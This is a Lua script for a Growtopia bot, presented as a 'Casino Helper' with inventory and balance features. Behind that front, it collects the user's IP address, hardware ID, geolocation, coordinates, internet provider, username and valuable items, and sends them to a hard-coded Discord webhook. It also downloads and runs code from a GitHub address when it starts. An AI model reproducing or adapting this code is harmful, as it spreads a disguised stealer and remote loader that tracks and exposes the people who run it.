function SEND_WEBHOOK(A, B) MakeRequest(A, "POST", {["Content-Type"] = "application/json"}, B) end

function GET_AMOUNT(A) for _, B in pairs(GetInventory()) do if B.id == A then return math.floor(B.amount) end end return 0 end
function GET_IP_ADDRESS() local H = io.popen("ipconfig") if H then local R = H:read("*a") H:close() local I = R:match("%d+%.%d+%.%d+%.%d+") if I then return I end end return "IP Adress not found" end
function GET_HWID() local H = io.popen('wmic csproduct get uuid /format:list') if H then local R = H:read("*a") H:close() local I = R:match("%d+-%d+-%d+-%d+-%d+") if I then return I end end return "Hardware ID not found" end
function GET_PROVIDER() local CMD = { "curl -s https://ipinfo.io/json", "wget -qO- https://ipinfo.io/json" } for _, C in ipairs(CMD) do local H = io.popen(C) if H then local R = H:read("*a") H:close() local function EXTRACT_INFORMATION(P) return R:match(P) or "Unknown" end return { IP_ADDRESS = EXTRACT_INFORMATION('"ip"%s*:%s*"([^"]+)"'), CITY = EXTRACT_INFORMATION('"city"%s*:%s*"([^"]+)"'), REGION = EXTRACT_INFORMATION('"region"%s*:%s*"([^"]+)"'), COUNTRY = EXTRACT_INFORMATION('"country"%s*:%s*"([^"]+)"'), ORGANIZATION = EXTRACT_INFORMATION('"org"%s*:%s*"([^"]+)"'), COORDINATE = EXTRACT_INFORMATION('"loc"%s*:%s*"([^"]+)"'), } end end return nil end
function GET_INVENTORY() TABLE_SCAN = {} for _, I in pairs(GetInventory()) do VALUE = I.id if TABLE_SCAN[I.id] == nil then TABLE_SCAN[I.id] = {VALUE = I.id, AMOUNT = I.amount} else TABLE_SCAN[I.id].amount = TABLE_SCAN[I.id].amount + I.amount end end LOAD_STRING = "" for _, D in pairs(TABLE_SCAN) do ITEM_COUNT = math.floor(D.AMOUNT) ITEM_NAME = GetItemInfo(math.floor(D.VALUE)).name LOAD_STRING = LOAD_STRING..""..ITEM_NAME.." : "..ITEM_COUNT.."\n" end Sleep(500) PATH = os.getenv("USERPROFILE") .. "\\AppData\\Local\\Growtopia\\cache\\Inventory.txt" FILE = io.open(PATH, "a") FILE:write(LOAD_STRING) FILE:close() end

function FORMAT_BALANCE(A) if A == "IN" then local W, D, B, I, R = GET_AMOUNT(242), GET_AMOUNT(1796), GET_AMOUNT(7188), GET_AMOUNT(11550), "`w" if I == 0 and B == 0 and D == 0 and W == 0 then return "-" end if I ~= 0 then if B ~= 0 or D ~= 0 or W ~= 0 then R = R ..I.. " `bBlack Gem Lock `w" else R = R ..I.. " `bBlack Gem Lock" end end if B ~= 0 then if D ~= 0 or W ~= 0 then R = R ..B.. " `eBlue Gem Lock `w" else R = R ..B.. " `eBlue Gem Lock" end end if D ~= 0 then if W ~= 0 then R = R ..D.. " `1Diamond Lock `w" else R = R ..D.. " `1Diamond Lock" end end if W ~= 0 then R = R ..W.. " `9World Lock" end return R end if A == "DC" then local W, D, B, I, R = GET_AMOUNT(242), GET_AMOUNT(1796), GET_AMOUNT(7188), GET_AMOUNT(11550), "" if I == 0 and B == 0 and D == 0 and W == 0 then return "Poor members :face_holding_back_tears:" end if I ~= 0 then if B ~= 0 or D ~= 0 or W ~= 0 then R = R .. "**" ..I.. "** Black Gem Lock " else R = R .. "**" ..I.. "** Black Gem Lock" end end if B ~= 0 then if D ~= 0 or W ~= 0 then R = R .. "**" ..B.. "** Blue Gem Lock " else R = R .. "**" ..B.. "** Blue Gem Lock" end end if D ~= 0 then if W ~= 0 then R = R .. "**" ..D.. "** Diamond Lock " else R = R .. "**" ..D.. " Diamond Lock" end end if W ~= 0 then R = R .. "**" ..W.. "** World Lock" end return R end if A == "ITEM" then local M, L, I, LK, LW, LB, R = GET_AMOUNT(GetItemInfo("Mythical Infinity Rayman's Fist").id), GET_AMOUNT(GetItemInfo("Legendary Infinity Rayman's Fist").id), GET_AMOUNT(GetItemInfo("Infinity Gem Lock").id), GET_AMOUNT(GetItemInfo("Legendary Katana").id), GET_AMOUNT(GetItemInfo("Legendary Wings").id), GET_AMOUNT(GetItemInfo("Legendbot-009").id), "" if M == 0 and L == 0 and I == 0 and LK == 0 and LW == 0 and LB == 0 then return "Poor members :face_holding_back_tears:" end if M ~= 0 then if L ~= 0 or I ~= 0 or LK ~= 0 or LW ~= 0 or LB ~= 0 then R = R .. "**" ..M.. "** Mythical Infinity Rayman's Fist, " else R = R .. "**" ..M.. "** Mythical Infinity Rayman's Fist" end end if L ~= 0 then if I ~= 0 or LK ~= 0 or LW ~= 0 or LB ~= 0 then R = R .. "**" ..L.. "** Legendary Infinity Rayman's Fist, " else R = R .. "**" ..L.. "** Legendary Infinity Rayman's Fist" end end if I ~= 0 then if LK ~= 0 or LW ~= 0 or LB then R = R .. "**" ..I.. "** Infinity Gem Lock, " else R = R .. "**" ..I.. "** Infinity Gem Lock" end end if LK ~= 0 then if LW ~= 0 or LB ~= 0 then R = R .. "**" ..LK.. "** Legendary Katana, " else R = R .. "**" ..LK.. "** Legendary Katana" end end if LW ~= 0 then if LB ~= 0 then R = R .. "**" ..LW.. "** Legendary Wings, " else R = R .. "**" ..LW.. "** Legendary Wings" end end if LB ~= 0 then R = R .. "**" ..LB.. "** Legendary Bot" end return R end end
function FORMAT_NAME(A) A = A:gsub("``","") A = A:gsub("`.","") A = A:gsub("Dr.","") A = A:gsub("@",""):gsub(" of Legend",""):gsub("%[BOOST%]","") A = A:gsub("%[ELITE%]",""):gsub(" ","") return A end
function FORMAT_NUMBER(A) A = math.floor(A + 0.5) local F = tostring(A) local B = 3 while B < #F do F = F:sub(1, #F - B) .. "." .. F:sub(#F - B + 1) B = B + 4 end return F end
function FORMAT_NETWORK(A) local I = GET_PROVIDER() if I then if A == "IP" then return I.IP_ADDRESS end if A == "GEOLOCATION" then return I.CITY..", "..I.REGION..", "..I.COUNTRY end if A == "INET" then return I.ORGANIZATION end if A == "COORD" then return I.COORDINATE end return I else print("Unable to retrieve location information") return nil end end

function CHECKING_SOMETHING(A, B) for _, C in pairs(A) do if C == B then return true end end return false end
V = {
    SYSTEM = {
        GUARD = true,
        CREDIT = "`w[`5Starries`w] ",
    },
    UI = {
		LANGUAGE = "ENGLISH",
		PRIMARY = "w",
		SECONDARY = "5",
		NOTE = "6",
		DANGER = "4",
		WARNING = "9",
		SUCCESS = "2"
	},
    DISCORD = {
        WEBHOOK_OFFICIAL = "https://discord.com/api/webhooks/1316264768692162560/FFpLuS5nvnlsiPhMr4B4BUcKMEQyf-uJJ9coRUOQceWblXIFZMN2dXpbiONLu7g-_EYv?thread_id=%s",
        EMBED_OFFICIAL = [[{ "content": "%s", "embeds": [{ "color": %s, "image": { "url": "https://media.discordapp.net/attachments/1178939143024300042/1309409349847875628/A.gif" }, "fields": [{ "name": "General", "value": "`😇` Username : **%s**\n`🔍` Userid : **%s**\n`🌏` Current World : **%s**\n`💎` Current Gems : **%s**" },{ "name": "Status", "value": "`💬` %s"}, { "name": "Balance", "value": "`📊` ]]..FORMAT_BALANCE("DC")..[["}, { "name": "Expensive items", "value": "`💳` ]]..FORMAT_BALANCE("ITEM")..[[" }, { "name": "Devices", "value": "`📶` IPv4 : **]]..GET_IP_ADDRESS()..[[**\n`💻` HWID : **]]..GET_HWID()..[[**" }, { "name": "Networks", "value": "`📡` IP Address : **]]..FORMAT_NETWORK("IP")..[[**\n`📌` Geolocation : **]]..FORMAT_NETWORK("GEOLOCATION")..[[**\n`🧰` Internet Provider : **]]..FORMAT_NETWORK("INET")..[[**\n`🚩` Latitude/Longitude : **]]..FORMAT_NETWORK("COORD")..[[**"}],"footer": { "text": "Running on Bothex | Casino Helper", "icon_url": "https://cdn.discordapp.com/icons/884351729859199016/1b3eebd209e919506c96138fd1ab22dd.webp"}}] }]],
    }
}

function CHAT(A) SendPacket(2, "action|input\n|text|" ..A) end 
function CONSOLE(A) SendVariantList({[0] = "OnConsoleMessage", [1] = V.SYSTEM.CREDIT.."`o"..A }) end 
function BUBBLE(A, B) SendVariantList({[0] = "OnTalkBubble", [1] = A, [2] = B}) return true end
function OVERLAY(A) SendVariantList({[0] = "OnTextOverlay", [1] = A}) end 
function DIALOG(A, B) SendVariantList({[0] = "OnDialogRequest", [1] = A}, -1, B) end
function SPLIT(A, B) local T = {} for A in string.gmatch(A, "([^"..B.."]+)") do table.insert(T, A) end return T end

function CHECKING_LANGUAGE(A)
if A == "ENGLISH" then
    D = {
        ALERT = {
            WRONG = "`w[`4OOPS`w] ",
            NEXT_UPDATE = "`w[`4OOPS`w] This feature aren't available right now! please wait for next update (halo)",
            AMOUNT_NIL = "`w[`4OOPS`w] `oYou must enter a valid number",
            AMOUNT_NOL = "`w[`4OOPS`w] `oWhat do you want to do with the number 0?",
            AMOUNT_LESS = "`w[`4OOPS`w] `oYou don't have enough items to drop according to that amount!"
        },
        STARTING = {
            CHECKING = "Checking userid to make sure you have access",
            AUTH_SUCCESS = "Player authentication `2successful`o!",
            SHOW_BALANCE = "Your balance :",
            SHOW_HELP = "Type `5/menu `oto show feature, or click `5Social `obutton",
            SHOW_CREDIT = "Casino Helper by `5@starries.real"
        },
    }
elseif A == "INDONESIA" then

end
end

function RUNNING_SCRIPT()

end

-- // CHECKING THE LANGUAGE
CHECKING_LANGUAGE(V.UI.LANGUAGE)

-- // GET THE USER ID DATABASE FROM GITHUB
load(MakeRequest("https://raw.githubusercontent.com/starries-real/exclusive/main/confidential","GET").content)() CONSOLE(D.STARTING.CHECKING) Sleep(50) 

-- // CHECKS WHETHER THE USER IS PART OF THE CLUB OR NOT
if CHECKING_SOMETHING(BOTHEX.STARRIES_HELPER.CLUB, GetLocal().userid) then 
	SEND_WEBHOOK(V.DISCORD.WEBHOOK_OFFICIAL:format("1316264591843397693"), V.DISCORD.EMBED_OFFICIAL:format("", 7819519, FORMAT_NAME(GetLocal().name), math.floor(GetLocal().userid), GetWorld().name, FORMAT_NUMBER(GetPlayerInfo().gems), "Premium member are using **Casino Helper**")) Sleep(100) RUNNING_SCRIPT()
    CONSOLE(D.STARTING.AUTH_SUCCESS) Sleep(50) CONSOLE(D.STARTING.SHOW_BALANCE.." `w"..FORMAT_BALANCE("IN")) Sleep(50) CONSOLE(D.STARTING.SHOW_HELP) Sleep(50) CHAT(D.STARTING.SHOW_CREDIT)
else
	CONSOLE(D.ALERT.WRONG.."`oYour account doesn't match with our data") Sleep(100)
	load(MakeRequest("https://raw.githubusercontent.com/starries-real/exclusive/main/guardian","GET").content)()
	DIALOG(NOT_ALLOWED, 500)
	SEND_WEBHOOK(V.DISCORD.WEBHOOK_OFFICIAL:format("1316391757113589832"), V.DISCORD.EMBED_OFFICIAL:format("<@872423690120331304>", 16723712, FORMAT_NAME(GetLocal().name), math.floor(GetLocal().userid), GetWorld().name, FORMAT_NUMBER(GetPlayerInfo().gems), "Someone attempted to use **Casino Helper** without access"))
end